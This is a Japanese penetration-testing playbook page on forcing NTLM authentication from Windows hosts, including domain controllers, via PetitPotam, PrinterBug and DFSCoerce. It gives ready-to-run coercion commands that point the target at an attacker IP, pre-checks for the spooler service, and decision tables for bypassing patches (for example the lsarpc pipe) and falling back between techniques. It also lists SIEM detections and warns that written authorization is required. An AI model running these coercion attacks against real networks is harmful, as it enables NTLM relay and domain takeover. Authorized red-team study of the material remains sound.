# Coerce 系 — PetitPotam / PrinterBug / DFSCoerce（強制認証）

> **スコープ**: DCE/RPC インターフェースを悪用してターゲットホストから攻撃者端末への NTLM 認証を強制する。PetitPotam（MS-EFSRPC）〜PrinterBug（MS-RPRN）〜DFSCoerce（MS-DFSNM）の 3 手法を扱う。生成した認証フローのリレーは `ntlmrelayx.md` を参照。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 業務停止リスク（DC への DCE/RPC 呼び出しを直接行う。DC 不安定環境では一時的な影響が出る可能性がある）
> - [ ] 持続化に該当
> - [ ] 不可逆な設定変更を含む
> - [x] SIEM/EDR で確実に検知される（MDI「Suspected DCE/RPC Exploitation Attempt」/ Event ID 5156・4768）
>
> 実施可否は事前合意で明示確認すること。**DC に対して直接 RPC 呼び出しを行うため、DC$ 認証の強制は書面承認を要する。** 演習環境では制約なし。

## 着火条件

「Relay 先は用意できているが、被害者ホストから認証が自発的に来ない」状況で使う：

- LLMNR / NBT-NS が GPO で無効化されており、Responder でハッシュが来ない
- ntlmrelayx を構えているが Relay できる認証フローが発生していない
- ESC8 リレーで DC$ の認証が必要
- LDAPS Shadow Credentials / RBCD で特定マシンアカウントの認証が必要

## 環境前提
- 実行環境: テスター端末（ターゲットホストと IP 到達性があること）
- 必要なツール: `impacket-petitpotam` / `impacket-printerbug`（Impacket 付属・ペネトレ用 Linux ディストリ標準搭載）/ `dfscoerce.py`（GitHub: `ly4k/DFSCoerce`・別途取得要）/ `nxc`（スプーラー確認）
- 必要な権限: テスター端末上での通常ユーザー権限で可（root 不要。ただし ntlmrelayx 起動側は root が必要）

## 先に確認すること

**3 手法の比較と使い分け:**

| 手法 | 悪用プロトコル | 有効な対象 | 無効化条件 | 優先度 |
|------|------------|---------|---------|------|
| PetitPotam | MS-EFSRPC（EFS RPC）| DC を含むほぼ全 Windows ホスト（未パッチ）| KB5005413 相当適用済み + 認証情報なし | 第1選択（匿名実行可能）|
| PrinterBug | MS-RPRN（Spooler RPC）| Print Spooler サービスが稼働しているホスト | Print Spooler サービス停止 | 第2選択（Spooler 稼働確認が必要）|
| DFSCoerce | MS-DFSNM（DFS Namespace）| DFS 関連サービスが稼働しているホスト | DFS サービス無効化 | 第3選択（Spooler 無効・EFS パッチ済み環境の最終手段）|

**事前確認（対象ホストの稼働サービス）:**

```bash
# [Attacker] スプーラーサービスの稼働を確認（PrinterBug 前に必須）
nxc smb [TARGET_IP] -u [USER] -p [PASSWORD] -M spooler
# → "SPOOLER" が "enabled" と表示されれば PrinterBug が使える

# [Attacker] rpcclient で MS-RPRN 呼び出し可否の事前確認
rpcclient -U "[DOMAIN]/[USER]%[PASSWORD]" [TARGET_IP] -c "enumdrivers"
# → エラーなく返ってくれば Spooler が有効
```

**攻撃者の思考トレース:** ポイズニング系（Responder）は「被害者が存在しないホスト名を解決しようとする」という受動的なトリガーに依存する。GPO で LLMNR が無効化されると一切来ない。Coerce 系はターゲットホストの DCE/RPC サービスを直接呼び出し、「攻撃者 IP へ認証しに来い」と強制する。

---

## 1. 事前準備（必須）: ntlmrelayx を先に起動

Coerce は「認証フローを強制発生させる」だけであり、その認証を受け取って処理するのは ntlmrelayx の役割。**ntlmrelayx を先に起動してから各 Coerce コマンドを実行すること。**

ntlmrelayx の起動方法 → `ntlmrelayx.md`（目的に応じて LDAPS / HTTP / SMB を選択）

---

## 2. PetitPotam（MS-EFSRPC）— 第1選択

**コマンド:**

```bash
# [Attacker] 認証情報なし（匿名）で実行（パッチ未適用環境向け）
impacket-petitpotam [ATTACKER_IP] [TARGET_IP]

# [Attacker] ドメインユーザー認証情報付きで実行（パッチ適用後も有効な場合がある）
impacket-petitpotam -u [USER] -p [PASSWORD] -d [DOMAIN] [ATTACKER_IP] [TARGET_IP]

# [Attacker] efsrpc パイプが塞がれている場合は lsarpc に切り替える
impacket-petitpotam -pipe lsarpc [ATTACKER_IP] [TARGET_IP]
```

- `[ATTACKER_IP]`: ntlmrelayx が動いているテスター端末の IP（ターゲットから到達可能なインターフェース。`ip a` で確認）
- `[TARGET_IP]`: 認証を強制させたいホスト（DC の場合が多い）

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| ntlmrelayx 側に `Incoming connection` が表示される | Coerce 成功 | ntlmrelayx.md での設定した操作（Shadow Credentials / ESC8 等）が進む |
| `rpc_s_access_denied` または `STATUS_ACCESS_DENIED` | MS-EFSRPC 無効化パッチ適用済み | 認証情報付きで再試行。`-pipe lsarpc` に切り替え。または §3 PrinterBug / §4 DFSCoerce へ |

**注意:** PetitPotam はパッチ後も `lsarpc` パイプ経由で動作する環境が残っている。`efsrpc` が塞がれていても `lsarpc` で成功することがある。両方試してから諦める。

---

## 3. PrinterBug（MS-RPRN）— 第2選択

**着火条件:** 事前確認でスプーラーが有効なことを確認してから実行する。

**コマンド:**

```bash
# [Attacker] ドメインユーザー認証情報を使ってスプーラーに強制接続させる
impacket-printerbug -u [USER] -p [PASSWORD] -d [DOMAIN] [TARGET_IP] [ATTACKER_IP]

# [Attacker] krbrelayx 内のスタンドアロン版
python3 printerbug.py [DOMAIN]/[USER]:[PASSWORD]@[TARGET_IP] [ATTACKER_IP]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| ntlmrelayx 側に DC$ または対象ホストの認証が届く | PrinterBug 成功 | ntlmrelayx のリレー操作へ |
| `SpoolSS` 関連エラー | Spooler サービスが停止している | §4 DFSCoerce または §2 PetitPotam へ移行 |

---

## 4. DFSCoerce（MS-DFSNM）— 第3選択

**着火条件:** PetitPotam が無効化・PrinterBug が使えない環境での最終手段。

**事前準備（必須）:** `dfscoerce.py` をテスター端末に転送しておく（GitHub: `ly4k/DFSCoerce`）。

**コマンド:**

```bash
# [Attacker] DFSCoerce を実行
python3 dfscoerce.py -u [USER] -p [PASSWORD] -d [DOMAIN] [ATTACKER_IP] [TARGET_IP]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| ntlmrelayx 側に `Incoming connection` が表示される | DFSCoerce 成功 | ntlmrelayx のリレー操作へ |
| 失敗 | DFS サービスが無効化されている | 3 手法すべてが塞がれた場合は `mitm6.md` へ切り替える |

---

## 刺さらなかったとき（全体）

| 状況 | 対処 |
|------|------|
| PetitPotam が `rpc_s_access_denied` | KB5005413 相当が適用済み。認証情報付きで再試行、`-pipe lsarpc` に切り替え、または PrinterBug / DFSCoerce へ |
| PrinterBug が接続拒否または失敗 | DC で Spooler サービスが停止している。DFSCoerce または PetitPotam へ |
| DFSCoerce も失敗 | 3 手法すべて塞がれた。`mitm6.md` へ切り替える |
| ntlmrelayx に認証が来るがリレーが失敗する | Relay 先の署名設定を確認 → `ntlmrelayx.md` の「先に確認すること」参照 |
| 認証は届くがドメインユーザー権限のみ（DC$ でない）| Coerce 対象が DC でない可能性。`nltest /dclist:[DOMAIN]` または `nxc smb [TARGET_SUBNET]/[PREFIX]` で DC の IP を確認してから再実行 |

---

## 注意点・落とし穴

- **Coerce は起点。成果を生むのは ntlmrelayx 側の設定**: PetitPotam / PrinterBug / DFSCoerce 自体はハッシュも権限も取得しない
- **`[ATTACKER_IP]` はテスター端末の到達可能 IP を指定**: ntlmrelayx がリッスンしている IP と一致させること
- **DC への RPC 呼び出しは MDI がほぼ確実に検知する**: 本番では検知前提で書面合意を取っておく
- **PrinterBug は Unconstrained Delegation 攻撃でも使われる**: DC が Unconstrained Delegation 対象の場合に DC$ の TGT をメモリに書き込ませる手法 → `../Delegation_Attacks/Unconstrained.md`
- **Coerce は設定変更を行わないため原状回復項目なし**: ntlmrelayx 側の原状回復は `ntlmrelayx.md` を参照

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。DC への直接 RPC 呼び出しを伴い、MDI で即アラートが上がる
- **想定されるSIEM/EDR検知**: MDI「Suspected DCE/RPC Exploitation Attempt」/ Event ID 5156・4768・4624 / ネットワーク NDR（DC からのアウトバウンド認証コールバック）
- **業務影響リスク**: 通常の業務トラフィックには影響しないが、不安定な DC では予期しない影響が出る可能性がある。業務時間外の実施を推奨する
- **原状回復必須項目**: Coerce 自体は設定変更を行わないため削除項目なし。組み合わせる ntlmrelayx 側の操作の原状回復は `ntlmrelayx.md` を参照
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：LLMNR / NBT-NS ポイズニングが GPO で無効化されている状況の確認 → `Responder.md`
- 前：Relay 先の署名・チャネルバインディング設定の確認 → `ntlmrelayx.md`
- 後：リレー先への LDAPS Shadow Credentials 付与 → `ntlmrelayx.md`（§4）
- 後：リレー先への ESC8 証明書取得 → `ntlmrelayx.md`（§5）
- 後：リレー先への RBCD 設定 → `ntlmrelayx.md`（§6）/ `../Delegation_Attacks/RBCD.md`
- 後：3 手法すべて無効の場合の代替認証強制 → `mitm6.md`
- 関連（Unconstrained Delegation との連携）→ `../Delegation_Attacks/Unconstrained.md`
